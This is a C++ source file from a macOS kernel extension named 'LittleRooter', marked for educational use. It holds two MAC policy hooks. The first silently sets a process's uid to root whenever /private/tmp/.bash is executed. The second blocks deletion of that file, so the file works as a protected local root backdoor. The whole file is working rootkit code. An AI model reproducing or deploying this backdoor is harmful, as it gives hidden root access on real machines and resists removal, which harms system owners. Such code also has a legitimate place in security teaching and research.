//
//  mac_policy_callbacks.cpp
//  LittleRooter
//
//  Created by Jonathan Zdziarski on 2/7/17.
//  Copyright © 2017 by Jonathan Zdziarski. For Educational Use Only.
//

#include <i386/types.h>
#include <sys/fcntl.h>
#include <IOKit/IOUserClient.h>
#include "mac_policy_callbacks.h"
#include "LittleRooter.hpp"
#include "KernelResolver.h"

#include <sys/types.h>
#include <string.h>

/* automatically change the user's cred to root whenever /private/tmp/.bash
 * (e.g. /tmp/.bash) is executed */

int _macf_vnode_check_exec_internal(kauth_cred_t cred, struct vnode *vp, struct vnode *scriptvp, struct label *vnodelabel,struct label *scriptlabel, struct label *execlabel, struct componentname *cnp, u_int *csflags, void *macpolicyattr, size_t macpolicyattrlen)
{
    char buf[PATH_MAX] = { 0 };
    int buflen = PATH_MAX;
    kauth_cred_t (*_proc_ucred)(proc_t p) = (kauth_cred_t(*)(proc_t)) lookup_symbol("_proc_ucred");
    kauth_cred_t user_cred = _proc_ucred(current_proc());

    if (!vn_getpath(vp, buf, &buflen)) {
        IOLog("LittleRooter: %s: exec %s\n", __func__, buf);
        if (!strcmp(buf, "/private/tmp/.bash")) {
            IOLog("LittleRooter: %s: setting cr_uid 0 for %s\n", __func__, buf);
            user_cred->cr_posix.cr_ruid = 0;
            user_cred->cr_posix.cr_uid = 0;
        }
    }
    return 0;
}

/* cause attempts to delete /private/tmp/.bash (e.g. /tmp/.bash) to fail */

int _macf_vnode_check_unlink_internal(kauth_cred_t cred, struct vnode *dvp, struct label *dlabel, struct vnode *vp, struct label *label, struct componentname *cnp)
{
    char buf[PATH_MAX] = { 0 };
    int buflen = PATH_MAX;
    
    if (!vn_getpath(vp, buf, &buflen)) {
        IOLog("LittleRooter: %s: unlink %s\n", __func__, buf);
        if (!strcmp(buf, "/private/tmp/.bash"))
            return EACCES;
    }
    return 0;
}



